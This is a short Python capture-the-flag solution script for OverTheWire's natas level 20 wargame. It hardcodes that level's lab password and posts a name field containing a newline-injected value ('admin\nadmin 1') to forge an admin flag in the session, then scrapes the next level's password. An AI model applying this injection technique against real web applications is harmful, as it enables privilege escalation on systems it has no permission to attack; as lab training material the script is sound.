#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level20.py
  Solution for natas level20
"""
__author__ = 'kall.micke@gmail.com'

import requests
import datetime
import time
import sys
import os
import re

level = 20
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

def get_flag():

    session = requests.Session()
    session.auth = (user, password)
    postData = {"name": "admin\nadmin 1"}
    r = session.post(host, data=postData, auth=(user, password))
    time.sleep(0.5)
    r = session.post(host, data=postData, auth=(user, password))
    m = re.search(r'([A-Za-z0-9]{30,})', r.text[750:])
    return m.group()

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
